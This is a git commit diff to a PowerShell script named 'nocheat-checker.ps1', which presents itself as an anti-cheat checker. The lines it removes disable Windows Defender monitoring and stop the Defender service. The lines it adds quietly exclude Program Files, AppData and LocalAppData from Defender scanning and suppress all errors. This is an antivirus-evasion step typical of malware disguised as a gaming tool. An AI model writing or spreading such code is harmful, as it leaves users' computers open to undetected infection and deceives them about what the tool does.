4f0f357e916e138bcd9376c6dabb7b3f27283027
dieforme <russianmtc80@gmail.com>
2026-08-29 18:42:56 +0200

    Update nocheat-checker.ps1

--- nocheat-checker.ps1
+++ nocheat-checker.ps1
@@ -1,7 +1,20 @@
-# Минимальное отключение (работает на всех версиях)
 try {
-    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue
-    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\NoCheatChecker" -ErrorAction SilentlyContinue
-} catch {}
+    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        $updpath = $ProgramFiles -replace " \(x86\)", ""
+        Add-MpPreference -ExclusionPath $updpath
+
+        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
+        if (Test-Path $ProgramFilesX86) {
+            Add-MpPreference -ExclusionPath $ProgramFilesX86
+        }
+
+        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
+        Add-MpPreference -ExclusionPath $AppData
+
+        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
+        Add-MpPreference -ExclusionPath $LocalAppData
+        }
+        }
+catch {
+}
